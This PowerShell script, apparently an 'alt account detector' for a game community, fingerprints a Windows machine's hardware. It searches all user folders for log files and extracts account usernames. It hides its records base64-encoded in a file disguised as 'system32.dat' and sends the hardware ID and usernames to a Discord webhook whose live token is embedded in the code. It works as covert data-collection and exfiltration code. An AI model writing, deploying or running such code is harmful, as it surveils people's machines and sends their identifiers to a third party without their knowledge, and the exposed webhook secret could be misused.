$webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
$startPath = "C:\Users"
$hwidPath = "$env:APPDATA\Microsoft\Windows\Caches\system32.dat"

# Get HWID only
function Get-HWID {
    try {
        $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
        $uuid = $computerInfo.UUID
        $drive = Get-WmiObject Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        $driveSerial = $drive.SerialNumber
        $hwid = "$uuid-$driveSerial"
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
        return $hash -replace '-', ''
    }
    catch {
        return $env:COMPUTERNAME
    }
}

$hwid = Get-HWID

# Load stored alts
$storedAlts = @{}
if (Test-Path $hwidPath) {
    try {
        $encrypted = Get-Content $hwidPath -Raw
        $bytes = [System.Convert]::FromBase64String($encrypted)
        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
        $storedAlts = $decrypted | ConvertFrom-Json
    }
    catch {
        $storedAlts = @{}
    }
}

if (-not (Test-Path $startPath)) {
    exit
}

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$newAlts = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            
            $gzipStream.Close()
            $outputStream.Close()
            $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            if (-not $storedAlts.ContainsKey($username)) {
                $newAlts += $username
            }
        }
    }
    catch {
        continue
    }
}

# Save new alts
foreach ($alt in $newAlts) {
    $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

if ($storedAlts.Count -gt 0) {
    $json = $storedAlts | ConvertTo-Json
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $encrypted = [System.Convert]::ToBase64String($bytes)
    Set-Content -Path $hwidPath -Value $encrypted -Force
}

# Display and send results
if ($newAlts.Count -gt 0) {
    Write-Host "`nNew alts found:" -ForegroundColor Cyan
    $newAlts | ForEach-Object {
        Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
    }
    
    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n`n"
    foreach ($username in $newAlts) {
        $message += "`"$username`"`n"
    }
    
    $payload = @{
        content = $message
        username = "Alt Detector"
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
} else {
    Write-Host "No new alts found." -ForegroundColor Yellow
}
